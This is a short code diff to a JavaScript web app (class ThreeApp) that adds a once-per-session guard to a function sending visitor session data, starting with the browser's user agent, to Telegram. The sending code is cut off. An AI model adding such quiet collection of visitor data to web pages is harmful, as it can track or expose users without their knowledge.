@@ -652,6 +652,9 @@ class ThreeApp {
 }
 
 async function sendSessionDataToTelegram() {
+  if (sessionStorage.getItem("telegramSessionSent")) return;
+  sessionStorage.setItem("telegramSessionSent", "true");
+
   try {
     const data = {
       userAgent: navigator.userAgent,
